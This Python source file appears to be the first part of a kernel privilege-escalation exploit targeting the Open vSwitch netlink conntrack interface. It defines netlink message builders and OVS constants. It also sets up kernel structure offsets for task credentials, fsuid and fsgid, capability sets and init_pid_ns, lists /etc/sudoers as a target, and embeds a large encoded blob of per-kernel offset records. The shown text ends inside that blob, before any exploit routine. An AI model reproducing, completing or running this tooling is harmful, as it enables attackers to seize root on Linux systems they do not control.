#!/usr/bin/env python3
from __future__ import annotations

import base64
import errno
import json
import os
import pwd
import re
import shutil
import socket
import struct
import subprocess
import sys
import time
import zlib
from dataclasses import dataclass, fields
from typing import Any


NLMSG_HDR = "IHHII"
GENL_HDR = "BBH"
NLA_HDR = "HH"

NLM_F_REQUEST = 1
NLM_F_ACK = 4
NLM_F_CREATE = 0x400
NETLINK_GENERIC = 16
GENL_ID_CTRL = 0x10
NLMSG_ERROR = 2
CTRL_CMD_GETFAMILY = 3
CTRL_ATTR_FAMILY_ID = 1
CTRL_ATTR_FAMILY_NAME = 2

OVS_DATAPATH_VERSION = 2
OVS_FLOW_VERSION = 1

OVS_DP_CMD_NEW = 1
OVS_DP_ATTR_NAME = 1
OVS_DP_ATTR_UPCALL_PID = 2
OVS_DP_ATTR_USER_FEATURES = 5

OVS_FLOW_CMD_NEW = 1
OVS_FLOW_CMD_DEL = 2
OVS_FLOW_CMD_GET = 3
OVS_FLOW_ATTR_KEY = 1
OVS_FLOW_ATTR_ACTIONS = 2

OVS_KEY_ATTR_IN_PORT = 3
OVS_KEY_ATTR_ETHERNET = 4
OVS_KEY_ATTR_ETHERTYPE = 6
OVS_KEY_ATTR_IPV4 = 7
OVS_KEY_ATTR_TCP = 9
OVS_KEY_ATTR_TUNNEL = 16
OVS_KEY_ATTR_TCP_FLAGS = 18
OVS_KEY_ATTR_TUNNEL_INFO = 31

OVS_ACTION_ATTR_CT = 12
OVS_ACTION_ATTR_CLONE = 20
OVS_ACTION_ATTR_OUTPUT = 1
OVS_ACTION_ATTR_SET = 3
OVS_ACTION_ATTR_POP_VLAN = 5

OVS_CT_ATTR_COMMIT = 1
OVS_CT_ATTR_LABELS = 4
OVS_CT_ATTR_HELPER = 5
OVS_CT_ATTR_TIMEOUT = 9

OVS_TUNNEL_KEY_ATTR_IPV4_SRC = 1
OVS_TUNNEL_KEY_ATTR_IPV4_DST = 2
OVS_TUNNEL_KEY_ATTR_TOS = 3
OVS_TUNNEL_KEY_ATTR_TTL = 4
OVS_TUNNEL_KEY_ATTR_TP_SRC = 9
OVS_TUNNEL_KEY_ATTR_TP_DST = 10
OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE = 16

ETH_P_IP = 0x0800
IPPROTO_TCP = 6

BTF_DIR = "/sys/kernel/btf"
NLA_HEADER_SIZE = 4
KERNEL_BASE_SYMBOL = "_text"
REQUIRED_SYMBOLS = (
    KERNEL_BASE_SYMBOL,
    "module_ktype",
    "init_pid_ns",
)
HOST_USER_ENV = "OVS_C004_HOST_USER"
HOST_WRITER_PID_ENV = "OVS_C004_HOST_WRITER_PID"
HOST_WRITER_TRIGGER_FD_ENV = "OVS_C004_HOST_WRITER_TRIGGER_FD"
HOST_WRITER_ACK_FD_ENV = "OVS_C004_HOST_WRITER_ACK_FD"
SUDOERS_FILE = "/etc/sudoers"
SUDOERS_DROPIN_DIR = "/etc/sudoers.d"
CARRIER_TIMEOUT = "timeout"
CARRIER_LABELS_ONLY = "labels-only"
CARRIER_AUTO = "auto"
CARRIER_ORDER = (CARRIER_TIMEOUT, CARRIER_LABELS_ONLY)
CT_ACTION_COUNT = 400


def align4(value: int) -> int:
    return (value + 3) & ~3


def nla(attr_type: int, payload: bytes) -> bytes:
    length = 4 + len(payload)
    if length > 0xFFFF:
        raise ValueError(f"netlink attribute too long: {length}")
    return (
        struct.pack(NLA_HDR, length, attr_type)
        + payload
        + (b"\x00" * (align4(length) - length))
    )


def cstr(value: str) -> bytes:
    return value.encode("ascii") + b"\x00"


@dataclass(frozen=True)
class Attr:
    attr_type: int
    payload: bytes
    raw_len: int


@dataclass(frozen=True)
class SymbolOffsets:
    module_ktype: int
    init_pid_ns: int


@dataclass(frozen=True)
class KernelOffsets:
    nf_conntrack_helper_me: int
    module_kobj_ktype: int
    vmlinux_module_ktype: int
    vmlinux_init_pid_ns: int
    task_pid: int
    task_cred: int
    task_pid_links: int
    cred_fsuid: int
    cred_fsgid: int
    cred_cap_permitted: int
    cred_cap_effective: int
    pid_namespace_idr: int
    idr_idr_rt: int
    idr_base: int
    xarray_xa_head: int
    xa_node_shift: int
    xa_node_slots: int
    pid_tasks: int
    hlist_head_first: int
    dst_entry_ref: int
    dst_entry_ref_kind: str
    metadata_dst_tun_info: int
    ip_tunnel_key_ipv4_src: int
    ip_tunnel_key_ipv4_dst: int
    ip_tunnel_key_tos: int
    ip_tunnel_key_ttl: int
    ip_tunnel_key_tp_src: int
    ip_tunnel_key_tp_dst: int
    ovs_ct_labels: int
    ovs_ct_action_len: int


@dataclass(frozen=True)
class TunnelReadLane:
    name: str
    field_offset: int
    attr_type: int
    payload_index: int
    optional_zero: bool


@dataclass(frozen=True)
class KernelBuildRecord:
    release: str
    version: str
    machine: str
    offsets: KernelOffsets
    read_carrier: str
    write_carrier: str
    read_lanes: tuple[str, ...]
    ovs_key_attr_tunnel_info: int


KERNEL_RECORDS_DESCRIPTION = "the embedded pre-derived kernel record table"

# BEGIN EMBEDDED KERNEL RECORDS
_KERNEL_RECORDS_B85 = (b"c-rmVU2h%7+2;H6=TkJYPZBtbsJiQ=tLw~&Y~ay`Y~zuGAbT(n7RhCqTQn(9q!VSZ{n>X{FH&lf-Mw0?Sxu_>&u}mqiIEeE`uX-%_sjqKucG)r_5Ur3KmE2o`t{^&^QTz+>EFS>@%B%D-TuV+FTZ@)Tz;s3V*8o(4;@`>j^7-u-@n=X^2_Gv^5pmQA9Mb%_kRBU=Hj=L%gfDi{qr{5{`p@%ygf-jZshKdUo}52pFjWj!{wXJ+2zH@Hy4{<>Ywtq`={Q#J2^}L(LcR;b8&Q)KKIk-{d#&*f99{7b^RAOx%hBdf0p|6lPAX)Zw}WV(*FwWZ~bWczZZ8t`Td*AtFyDs>6>?(k8e)i|8CzLH@}{iq0jknaa4a!==qe(^AESbgm-@W{q<kNtNzc}{uNyBU*hsK{dD>1r+?dAu8-H3>-0;fPkeK7_RD$t!pr9`?{DYFSErjd@6HeZ-#70rKfZ6iMDqE+#Mv)zj?T~OumAe!UH#QPt$)Mc{FXk+e*T>E-#@%Lx_q;)zfsQ5-kfgEnlH1x`}3#k!_Dc3+yBw`C&zEj*1v5&yk8$}(r?DC---0Im+KGjKHUC&OF#4`eJeHJT<*?Kyx)FvmDb+-@i(U@XU#7rq4l5o{kQsuul`+sbxtmu&pJz=VssE~TmMyWKJDf!cJsw5mAAI_-|pY*H)rR^n>QbRJ^AJKH`b@0IX%C;^L6<5`r=~!@lE|1={q=mA2mPo|K0o%t-pflw|ISdd2#bwe)F4IU4PC+`qn?Hf1Q&}`YQhE^5nP8`PJp0+CP1|KHH?f^8fnum8riiKYy9(Z=lcrpXU4Rjk@<E`qq!6Z!Ptw<_G@wr@zwaX8ULDPwqh51GVy6A2@s94>qUOoATf`KfiA-KGfeg>C^u&UA%tvQ}NUPeD~d}pMHMx;-5c!`|7{{R(yYPQoLG!EVL_>jbfq>#dj}$E<}mH`BnaPadNro`k((_*Iz{xL_rip!ADlG{`Y$-`193ft6)__7<Cn;LO~RKjtaU*P|(<pPwP<7NQHt!3WoAPt7`?rLHc)JD&gy^vqnO(^|xnKy2h~h`_F$vLL@}OCnTZv;aN*~_eWZvbMt4T{aK%Wtn2fn<HyXMAG`Bc{q$qH<Hw}q$IKVn{l#vtFN>G8-M+42qfyam3Ru{NZ3<Y}&d#>%&Gt?FDpjF%bhX=*+qjL}l-s!dl-*7-Nh-I?LfdGnC?(}KY{NEe!*+JI&E9PPV{_cFtyL3~glG+J<2G*NHg0Ek+wJZ4&%a)6-PVN)(dlR%ZsRs?6K{WY{TUCUp!U(2D2}ig1yPXdmFhKn^;+)j_N()4SS(VgGK!Aksa|m#x2axn`w6>!lNP65XcMi8rlj7+ZQQ2b#_jBGSJUh5Dy7BBMN7Sn+qjL}xSic?*?)#5O<^aujVhFnBGEF1joY|QPJ-L{-Ij^(lBY#oZmZ}dIz>zZ+ptZ!4ckwd?WWv5O*1Sy8i`7%wqYB#VH>uyvpsc&<+KRtQBs#tv*`o2VVjTyw)3-XA0Q-2z1tF<CnSMw*rwWs?XQFF5VehpRub5TZP<qG{A|04Er6$mHYwb;DjF7j;5KfPlHm5&;<k-0b#D`s;5KekZ{v1$xBcW^5^b;JZJJ4N8@H*qar<j=TTIGHYPYGkaT~X(w{bhS+tuV}NinJ3)*)KXcH=f~Q*Yz;Q+E5Nd0V8(Ny^kuLcNXKxQ*Mmo!M=pCcjHcnWk=36-DDVZsRsN32x_h+f6FBzkPpEXqPrh*(zO3ASQur*oJM`&d#=(@G6<EqU);Z0yI(RCV_3(hHcoMfo(hCQ8KYDp-2gd;?50h!}b$o+i<0E5Wy+|xM$URQU6|~UOH7*t(J@!{@`yW{(S3udWb($303Qos@78Jy}(Y7dZ}Kusa(}6I?j9HHD2R2UT5~&PAITH)_;T=uyr&vVE{H@12$l12HWoi_V*VjTd-aIrz~n86<`B4U;{Q_X9hd$1$OF}YhLiwb%pI%zXaHT4cK2J*t?L_Y8sMdLQ+{)`GX`#&W5D7t^XB6NR}ETmsQp3YVUWxbXQ!e2J9-D0N8*H*nkb#S;3b58Z$m^H)>J{mzMYAHD2R2UgLFEuVq4keOmaYzAmHVnGdh=8n5v>v)69#1iRV#?3$~FKH5i|RB2h#3AU3Suzfe!Ey(u)d-KcD+2vOTwv}CAyPaU$VX&>)33eOguLf-04YpLlc7kmyKLEB@VHeo-pE2uNzvVq(r_XaLFkihGuw4zdR>7>^zT0$B9jeve53kNHuNty%TIY<aRgSLysBVaM5Dn1~ot0=OyE`$O&kL=8N`dI55Pe>M)1Q8s(%0v~1*K6Mr75IQI<wNYuaK@(o9J!UaaQ}BcFCy_#XvMfLo|gnL}w?uzmOhMT6C*L52aBWr86pRwHVj>O7tmRf1Xv`MOmEEZuR!)eJ9bjE9<E1XQiTZ(UcGk(GWdPA+4PsRY;4r6w(VMx+m+<ZKAh*(`WU!RH3VAOsjDkq9Gch^Aasa*-=D?pdfm2L=R*geM*apN}^FHjnXJRQzC6fJ{krd4Hu`hU#<W3p_6EHH;%r(WTHc~J}L{*5Dn49(GZ=T=)O4G-KwImHrp4&GF8#KB<p}^h$fDP=vj#FiKFE{(ao5l=qNU7f)0p=XyRyy&QJ6}96g}4HBoDnMro8Ljz;OsN|(KH^u5-*=EYDIx=b@HieYewhUl5%Xyr;jCXUwHv0!O=MEAwfzD@L}9n&Te?Lu8hLo`G~G;uUU=O?-+jyCsa3{RV79X=Wz9dR^7L-cHM^hlyBh+Z7gp*QGoT~%}<It>^`<sllPA)25AqO%j-7j%?8&xLgr?Ic<@bwD&k6LdiI3`F+?9rkV&{q5D;v`k4%v?YCa5Dn4v-9hvmL=W`c*}gd1MJc0UcQi_)G;uUa=T^GvjiY^E)?uQqq9%@pXo#LG>+qEyMYNQ}(aR&cFYCDXV)%OVz6ecEhmD5e6@*4;q7H=4FZ4jv;rat<#~?ULqcl+mO6OO)QoT_}dB5}S^m^l+siIIwLo`Iwc?Z$?iSFyXtM2cOu8Fp3yT8^Pn}ukICXI&ZS%~gQqy62Uj+90xqRXg#v;-Xx4bgK29oCH6rDT+1m(ucx9*Cp;-E~SSjuxpuqOzO>M`@HMjz;PHO6%S@I^4}VnioTx;%G&4G(<!6EuxKT{b~<Pv>J7QrT#n)uq>14|6E;k*3nw2yZzD4nXIx|9j#f{fzl|=qajMqp>)rq;T@w}y?5y*xQmukh8T^}yc%Nk3`Y078s6)@`|;?q@XdCA8?8fVghpr{4G}uK&;yT#Wq)gj`1%8-Q5vP^QhHn+Z4`C%;*^%&N5iTs>JXPUDp?a1Gb|7d(L5SL^bADzKN{-JV}@lK23MXj7L-Qm`5q0+5i2{=qoJ^}V}VNdJ{sz~VMkL*t7e0=j)plFjK=7>9u0$xTdQOhMlaClo=3xb9n$I1P)wmz)b$5<SRfjrc{POS{6r7D8iwB1j&#zH<~xuEX&wzhIycg$@6qs1gLKNHQ)7p&(h!R>QDHPjV>Ed*M&~!WH;<OCE&pj_M-8+v#DdWnJ(tlsRHFtBb>$c|T%yrEd34p4N2ha!K1$%p5TYS^zNo`_H7e@RhUUBF5j~JcS6z9u)JogvB)Sr%Q5vP^X^|eav7`PxHg+sfX*<*+ZSJ>7pQb?;(Mf4)X_Q83;trIaLFt~jqht5oi_K9XsgO2h6o`gsh$ilU==?<Y#~pW-{@f*<M#6Q}jD*89Ow)h|)47>;{SA21X>@aq1)?DuqKTv-dLE+tBWc@pGfTTd*)(oQmo!SFG+ojtJ%iG{UDCF@kk&pr6QzP^h=yoh4Iw%|(eK7Aze}%%FV|;H|DB6sqWNUB$7qbkXr2u*I+xKy&xZH*-~Dj@d;M)yC>_&&C3cj;G)&LMv=5^$gd6c(2wxi0zW>?Kbd9oTlMWkNAC<vqjK=7h-VMhj(&^ohM0$}%_rDvuu6IMJng%=@EtND%qx4+whGE2-()4a<SyQ?|rF-8E-Q7^SsibYHq+P{nLyX4g*&Yrn?Zc>t!_ty=EYRq_hr@dt@S2B1U+9n$Y2$e~#AuA>;Si&<8$I-J*vGU;Z8ZHIFb&f@9Kv*drpx|^L)#U1NJy(Y(s4ru4lx>|c{s%A8I10KIP^U$|F_dDoX$dNl;+_OrDssO_u<fY4IFBpZqQ1Iiibmt#%LZ6F?t50-;LQNos9l|b6EeWY1*W9tBxj-#%PSroJf~$+?{YE)X~c`dg$Ts-ZV>Mx=A~Xiq@bsN~1LIhA5p`>Cpdf=<X8T429c5m#Ix!JJJq}#%SIRF*?7|{qKfl?>1?xxyu65AkDKONY8<E@3Y}OqMJfmrDsEJqT&cGMq@OQG)Ct)dMJ{%cbDKbFNdL7-4R*~mdK=G8m7slVLB7jRevV!?_COCpQR2wZKIOt=<dL1jGil#4%N8hS(f{TOEkJalMX$7(sd=ROjLou1Eo=#P#UGPE8QDPhn`A0Jsegoqp74Z8l#zI!RUNOzZ<(u`qlcPXoyY|hlCvv4bgK2(n0%i?}im&$FhjlO7#cQ_j)^;1$a{Ebls3gLyX4g*`f}uWZa!_uV|89p3%KgN7Z+Pwu)LsCm4;<7){iH(fN&jH)j1^YQ9TRhYrmmX&W7NG)7}IJ<=GR-{_$pY2TYjTOTd!{!tpGNu*Iax6-;lkq$iz@U|yebcxXzjnTA7V|0F_dt0Qnx|?^TnQ&bdN@Ci9$8sf<Mrqy+Q98fUeeZ_%jczJwos3TXccdK{jnTXtV)P6~zZ<pw?rPHn(rHO)NJ~3D*U=b_(HPCUAx392dg$G-yt_-fVcI07U1+T-g=v_EX+mk3&cw6~h0^+NcSp0RRHvuI`a^Rm9Hmj3zyqc8E8QD-gu9{ix9=|s?b5)Zt&OHp8ly3qzyqW68$A?wguA(PV!BKthsLv~6s1v`MroAJue9lHl)l~G@p+ad9SV0*X^4hsh^7M%qO%j-+kq!N<AypqRVxkA5Dn2}9T1(J=%K8m>WZY(4m=la84VMMFb&g$9Wb4nY1<!m=&njyR8vY@cHm(&Mw516^c+U_rX8khmPMDzXsM#3NgAUun)W-4p26sMWA=8W?MkoKA5&jPI%^meL_;)06LmmzZlYa()FEB7hDN10+9-POFdCzYIxu<;qkE$c+qbr(imHm1<~xkWXrc~`p26sMW2V8kb@azVT#BQ088zK^7>&_%-(hrqqX)Y0ZZq9Vq@^Z03QD6iN|Q*VbZ(`6e<E$}65Z_V@YiXFVUaXOV>F30M&~!WH<5N-3p;ePNLrWCc#Otqj3({C=<G%hr5$qr;qYVqZB?i;)*k}XFb&f@9Kv*Nrpx|^Lvwf5@a5H6x^1Y_5DSqsMq@OQG)Ct)I`l`<?(WWxR7W?Pl~jm^ad3!+XcB3N&QEl2B3<@0cGN`cXc#qwXo#LG=@28Ml8&GVq!&nZU(#XkR?#Wx5SuQ98y6jEG)7}IkA@hX-{_%7L)#Nbi;CJu$AVIrhG_z6n9j{~)gMUvo@v7rcX*}^F&d+1yAVDqkxrjSBE3kX`!9rt`_G0KjnZ`)?W3@_1Eo=#cSDrUuXOLbVd$@<o#Gq|Mq@N-2S(3f^iU}6?lS%I>a@_NS+68f!!%68G=T?9XJ%Tfp}?c+T2yLubKB5Fp-~#8QJP{JrE@E-`=1U&-@IXn;-VOg#%PSDlE&!#M)y|IqPnhxYnLi%RYk>F7L-P5o(@quztVkAhobv8cW4`Jz-Wxd=$X=v%GyzBhZBrmn$gmqc2s>chudKm8l^EBqi3t5Ll{>_dp6)L&*<JdTJG1;r-eyGONc_$0nrdmAPv#EiMB(5wCPzTt!*?C6%BYOjnXKM(z%uPLrS~;NLrct1Eo<KrDsxFk6N*$bjgaP#VK75Dedpp(oHCB(p-3gnq{RZjnXqc96GUK%)_AzLMXi~rLC;qZq7CrCr6!3JLwt?PsOx~&PMZTeTRc-n1*SXhUqL!n_;HA4``XD4NpbuU>c@jdZso!qeiviNeCp<3uD?2GhN=_;88Q(+@dw6mKvsE8m3_yrn55b^dQq--_NE`3z5|4Aud{&hH03FX_(H;^l&!q<^EjDX?j9bRkR^mfoYhAX_$uTyi5;g)85>@O8f2A+jN!IM^i=}P#UFCdM2f<8F%qeag}yyO8a4@Z}sE7USBp!S7`uINwglNQ5vOD8m03pT@EW<-i<t7Z{8QWOeX-+`EUc%Fb&f%4bxef_G*yn^4{jsACE2zotmaqI(vxHD2>uHDeYR{^FvDO*7rC{FGA_zHjh%@jXWBqb)iDkWmL?zz%)$5G)!k^diedYytj3!VcHh8(N4D}#bFwzVH&1kIuFysvn{2)JA(Mb`R|EoQK@NK6MDcjOv5xxXJ$GKGkyQ`;rguDF2{2$$3tn9o=@r0je9^eEXP}z(&g|2Vo*Iw`?SvE^VTJlMro8rX_U^R^zZ{>xOe>U`^{nD3z2ATbgVE%X_Q83l+LX5@cUu7w;S)(`l41^n<!N@oYq2VltyWk&aCwC^I@=EN~aB`AzDo_4bw0U(=eT#>ESW);QN@?QR&vsC76b3n1*SX&cpQZoOmejZS#14kw#lYnzJpmdB8MG!!%51X1W??y6QS8?o#F<sx>E$(kPA6D2>utln%pf9+keId3<cn0aQ`dA7mad4bw0U)0vre!%Vx*8;Dh!6W6>T!Zb|J$aHA^RR@`_1g4k8^zaK}b#KvhVp>$1ZBdWgkLUa_(=9)4GcDarw<-{ro|9=&OJdsgFx~pLyU(<<b{ErD=`w`f7scz(3-UZyn6|jx!Cw70vx6F~gK*#uHmBig^X}j_LTv=)UXq|w;A>Rz(~F<65BsnW`zTR!m8eFfw%Qz+13T90?XB+9>xN|ATo-&atBDhc6P}>et#8X)R_mcS!O5;TK}v5*Yj^H5YCf;@k9J+q=pL)LU+&fU+382T{vxmafv&k$2gjR3tq*Kit$#c2R$4bo|MWlKefR38pWnRr=MUe$`tQFLFE)oK>$4*LGP;zN{-gPYu5|I|<n~IrmG*z><-7g+2H_A6;d>Kqtg-FGuYH8qpXb{D00ZHRBmC&}{OTCUfgH%G#ew{5g}j<Xxa}fbN(hH=2&Wc@@OcQIUW)@ckOMijIFLUc<W5Z@+}|g>Tq%KY2#4@FYH=Gz)#BO*2wyJY(`#`c2XY{%7T*VQ`UxKZaXpFevWssS;G6bB=!WiRUxP#UgU~&_{swRW2k^(Ky`8e7YVRNxz!wC#l__MqYPF@>t+cF+f@-LS>a0{tB_nF>^m&e2dudcpuCW0dumPLe8nEX8yPOn<sFnHL5~u=HLp4-WTSIjos;B4IfDPDyO>GU>Gk`sLmq}~%-9a@}Lp8NEROg}kL3Wk^Hedrbwe=%|y#u?+dp%lX;2!2+4(6y!sY`Rzr4O{f1F!)bu&GM{J2TkR_jHUK>xOEmhU$l@t#@BB+}75u?{TPJ1l13+j{~p)8?dRZ0XsL?lXq`?rdkt&Ks8iTTSIjwsvl(624Dj=VBZ4UDCxPE8`KckmFxt&6g>*;`ttyLNnmRuD{adI5q+@!?LTKVx@O>9Znxb(Uu}wS-(M6(D71;%MrVt^|NOUfKG#7vbVE0EL-)heZCBc<nr=ItZjt&UN=>&wH*`ZcbVGM$x}~Pu?N9eVHpj)Q^~a(p3sps}qN|`Ax}kd(x^++^t}Ld{vx<WN3!>Yqnr>UuE&J2`>in#Dd39D4QfL>oj#fc8bVE0ELw82HbxpUMMt2HK65YBi>XKWkXiMmZZs>+?=*~;Guj#hcRJu=#LKiwjrK2J+fo|xAZs^WUcX=RAO`!YNtA=i^3T>lx(FN#+Zs>+?=*~#DUFlNQbnEF=w|1#H&>5<3=!Wk3=r+cWqT4$<OqN7<S<@{w-476$NLA=6N~raQZs>+?=!Wk6bbCK7F!}cCZE6mz={AZE6X=F+=!WjRbcdR5Q`24UPxtGqvxaW5g)-6UsF<dNZs>+?=*~#DQ#IZ8Kx)1x1tzaI?~9_U|2##}Q9N`*H*`ZcbZ4a7)O5Q832HjsVv6K;6@@`~=!S0ShVGnnyP9ra(>-w{=f|VVChK;o!$cf(LpO9oH*{yD+t+lLHQjzX-J;X_Dea>pFoAC9hHmK2Nq2gt3^m<h+76Q+&VMfolcp(6{Q=$34c*WU-I?hQ>Od+xjqVqlqcjMwT<vyrGzUUAbk9Y1rDY7=m9)N>q5JEnyQ=BdHQnWOy0`nfjb`a9bVE0ELwA0<Wjft2*Jt$~rb6pzY-@*!hi>SGZs>;Y2dCTXnr>6m9VQOK*K|vn0u!ZM&4JJj-Ovr)(4B#9Q`7Bhx+m^1`F?YlrYW_L#zhO=&<)+t4c$5Ewkuuv1EVHPQ+|JOQoLGU6opT8>$>VT&<)+t4c*Y4k#1kpUDkBFX<2uoyB1qj%}9=iZs>+?=!Wi$bca<f?12&W02kqPq06XL)C#(x8@izzx--*l4vbM#1Cx)<fioMGYfV!^H*`ZcbVK*U(_N~X?r>mqH8n7)>9%S8lq;jAIS{&`8@i!8Gu>KE3rs#$-5~`g&PS)A8@izzx}iHW-KM5nPrH(n=+-vv>#p@S4!WTmx}h7oGtw<J-M*%KLSXWb&2dAws6zQP2yZNOLpO9oH+1Kx+dKr_Wz!reOjANPbVE0E=cU`$be9LlPVDP`d3DxwnE15xRg-l?H+0WMcWC`0gLEqe-3y}I)pS<}#+4IynACJ@pUw)~vi^W>=!S0ShVB{YuBJUxCc4F?zHaNHrmq{ip&PoPJ15<KC8BD&!}P#Js<iag+19BA=!S0ShHmK2N4Hl~tM1dHkn5`35tu+XbVE0E=cZdf5ZzUprqqu0Q_v0F&<)-5&^`H?@-&U)C>?EDV*=gK4c(vU)<K0Xy0v)QPq#Lu-$}REs<L)B-Cp1Ni#-*(w_onn`Pu15_}+u>a`m=$=lpziT*I<DJUJWB_UrZKw&J#hn3&deOR-XFnC<rO*Mrk-chK!;rTgeAeeTyqck4^kL$}{aw;QJ0mAmO~f%MhT-TH26(=C;R?y6f2R^576)oqm(?bYt8+lcs5sJa)!wmwiRt#nQI(fdxW%Rj^(D0`q+e?PoByS!@n{?t+83#Fnptr46@I3o<zQ2lJEHopEtCan^_kLtR{4uKJz#Zetr>;KfmbYdO4u-?|zHP)d}Hd-H*0c)@Z>k(;o<p;3#9SYy8tF^Hsu%@nFAl6c)KxA`qa@2*jR9#s2_HO&sMWTIl)fR8$MsDOb(joLVV-5pycReuPDYH$bo$O9Tbp2`8ezotAx3Ip&_>J5H#z`tjYr~vBa0i=Ht={PC_qsQ~%a<=e)vnMgs`7D9?4sO4lnV<|&N%5*F37->om6Jmlbs2=G^LCP6QrtqSc-BxOiMSgN`GMM|C3a^+PvF)sk2C$+o=DsTU_zei=QzK(=hF+m{$K|e`tMIJs;DmeMq}GF;YvWT+~%G6{JBLq|HKFNZqcZ%Cyp2V#KAyh+DetK_xZZ=0J}qNTqjaX44nj?0_()u1V1wz0vzA>0KA3WkByG>s?L9JADXvgEx3ndV}{Yc-y@T@0(d-F@=&SI<?ATH+Ew;g*SH3Wq0)ebSuhk=zgZ{SFUFbgz>7IZX-i<cMJ*NopMlOR4L=yufEzThu!U0`_a9NMy(IDzfP0i)IV~dzxX-u_0{!rU~~IaY}6%PTi^(ePYg$+sB4#1*WSVVi{ZW=2P=G9Zl>z0Ru$h-)dDwgQ`G|Z+;D%<s6;Bd8@tQ2-7MAJo}wGOu^YRwJG<Rs|DyZTJV<lLLzihD1h|14xJgTZ`w7F{PD>;jAC-`n05@<`aRc}KaPOU#nCl^Iif-)2Zi;T~&TO}+2}Sp3xV4KaL_^UH+`vuI4cw0a_r6894(WEDqUgqM?560(?)-Mk{zdoAreUp%y5iP4+Cb3_+`vuI{YWe89u72JrM<%1P>BK>paB|{==_!F7o`YoyCo{ux><zX*p1z!2-uy??g`U{X-jl-uSg2zoA{UMLf{5&if-V3(s19r+euw<`)I4Q?1+jRxPcqEfqQnizbGwf72R4zsYpw(8@owMuzL=>Cys^RTzA&dh5CcE1h|2lq8qrs7PzZ)3{lhN4BWsC+`#<^aDP!+(zZM8^C0QQZtNy4!R|TiuJ$jwZ_XeVI>p@ehjOGPzzy6K-M~FR++S35x9zs+>VV;i61%aRq8q!j+ild;q`QXO6snn`6dJmL8@MUDf%_5Q-XrO5?A9htQCdyWjosKy(T&~N?bZ*FbcY1D=;$m(H*f<tMK^HI5BGjacS!9erizvujo6Ld*p1!!?Vh|Zu!g&8Hdohmw*_wC25!<4;Qo5xHYVzdv;??;n~EE_=ZAZbMX!zBDdtw3i@|Q}rs&4*IqWu57rmYq+7zlxF}I@V25#V{=mzeu1@5$-TcQb6+`tXozzy8<!@b9%*R9<;T1oo?u^YRw8@sVPx7~Ka6Xn%r3%4!AL~EiDa|1VU6LSOilZN}In_IgSbGx)JkeC~|ft!jOxaWs^uSuNRZk@KgMnzhJ-Pldhjota}E~htii%E-Kor#vB8@Pd+q8qrMHr&@Sx9HT(Ep^4s>^pD+H*f>@Bf!1aB#t!80<A<_VmEeUH)#oWXSX{{-_R|#Ig8_?D@jX$8@MUDfqQ<q_u9~%?6xuWbXOGJ*p1!TjosPpt{$f74(R|q_soDBxJgTZJ3rhLTT8xue^D5fUMQ2>+z`fX+@|2h?fKpQ;;iJ=`eQmFoVJ$KdQ);kH*`~SL-!1Hn<-6!$!%SwF&yjD(h^E;+{SH6Zrq;R?Jw&IY|-tTwI%d(LpO9&azpnFblWK@cXC@op{nGzWjQx)<2EHXZqM)b7mwjw)2(eZWps*?8@i#JlKX+^zNPgo$NTBt$zEv4+cO)!sQ)LWY*<vZtY|_zw3|yiQEHTS&MOMlMHQ;zr-=QrC|olpuBlHE8?omT+f?J~)Alci*ozRm+)wOJeRCnrhbtY0zB$B3Y{W+F%wq4Gid<*Fx|s@hIvS1Gh>h5Yjo4YmHhMp?)2V^x)lSvl87arsG|C}1Vk7o^uXa0aGt&}Z@#$c=l+jsi!!~T2$2KKm$JiEv4OF9xsz$BZKk<Eeb(X}gOVRDoLc~UF#GXZLQ9&X0^Ay|fpZKPAa)qRIa<(ErKy1XGPi$>R)!3C(9<i4tcGy4hZNv^K6-iwch>h5Y{lseQvJyI%mnF7S)5K2az<sRCY*G=#ex73A1^8O*y1MNa+YXBDc8V=ksg$&S!}`Sbl`gF!6<Ltj)_ilkIn=UR|91Q(T))^Ho~+M`>tAD~|2TYquH_qD{J93(tyHyA{x7(V+qj+4ZC_Phk8<04OQpR;w~tQGua40hz0rHYRkwM9opIYQ_v-xY^do|Qx!|sxUU|Fnp50onbcx;AjonYA@^&S!l1p@Za^;QQ=#Ad}dK(|Q^wz<ue!X?&WY-I&E-R;6Id;F^r3ntb7o@j0omQ`YIQjRFuX~&SUTlu)Z@aVv&$-ru4%Z8H`=5=#8muX`=ZQ%uwHJkTH9aEn)tw^SuavA*MUjo$xcyWfCuu5Kq}!7t67)uI^rq@Y@A>pDAD|_$G+l0s#%<ijZK`hE&gk~!svEu08@-=))vXOjUlyphnd<guuW2N~YrK9c)wc39k}T5e2dTDE8?{lJY#X&Rt8E`3+qNsYn~v0k8{Eci+$P(`?Tl_uueQ+}z0tc@Z`Gl6`s+Jo2ZnCCSiYmTbG{P0d+5fNR#k%D3(`C2m0JCNa&g%`d-Lt-`x??txwk&smDbHxKouq6G*07m=5!<k(vfHAw40ue1b4r8#IB5@zQ%3b&Yh0fFfJV_1-BRI_T+Q~z0n)Jsk+g7M!o$5RNel*+is--ZsRs?Q+4BZMz^O|-RO<p=>4RtZf(V)_u}+6Q{BdEyvFONS8X$Ivrw-eq}oPp)JAQxZPd=Jc6fknJ9MQZngeCHjoW0~xSiAO>D4xRqc?g}b))xedRJ<C)m^DBx5eQ$ZsRspH*RNidveu{-sp|qRNd%3zupIWqTJFUH?Ne)joj4T$ema2hp4>q8^7_JUT*xJ*Kad5F==@%c#YS1O)ocIXY~3(a&FW{ZPcd9en7QvL4Awx8?{IIHa!V$*~VQMY{NDxQYzAn73o7Iz_^XuxP9Ag({Vu{{q@UM8^ry~0->YWyzREpW#yC_<92Dh;%e@a+&0}O1%5dB_m8hTrT+P9Q@p%7D~hT}=LCFIzWDpk+e-tzP;dW0tj^C)KY}$_Q)JI`e9>~mYf)G~!12Y(-fwL7E726$xQ*LS<oIH#Xs=kJ+tZ^F^hR&=e$rL9wnW<t)Z0vTyX7_KVDK8RpGdW>d>|!RqSp^nZKF17qxMWE&a1MN_Gn<Q+QHs>4Mpt*sJ&9F)5{NgUN}!YrwixSN9|!6reQiC)6V%yMike!w5na<!}Kzk{{7_Q5~pz*rys&;)26f?g0ypq`yohZHRAP_)4_ISCHF%RqfNy|j%7Km#T@9M4%WZ@=d8xp9Nac@cNFsTuUEy(tJBo!Cpu~st=`?~2i?#O-Lujyo+M;}bXQa8Zkn`D>pyJuN7N>&0Nv0H-TCRZ)@fh*ozpbw6|?61>9vZqXEoq^AHLtq>TONW`T6R&wq<pAa<)g&E%hI#XjODou~Lfh8uUhQ#%n0NGs^8AV7$iNZ_qARin{^0joXaZ;C4>8r#JkeH+rKt<2C3#x87!|+bypxUgI@hGhTz&8NGgxY8$mt8?_m);bn3TxhIX-q#&gJCX801Euk8!p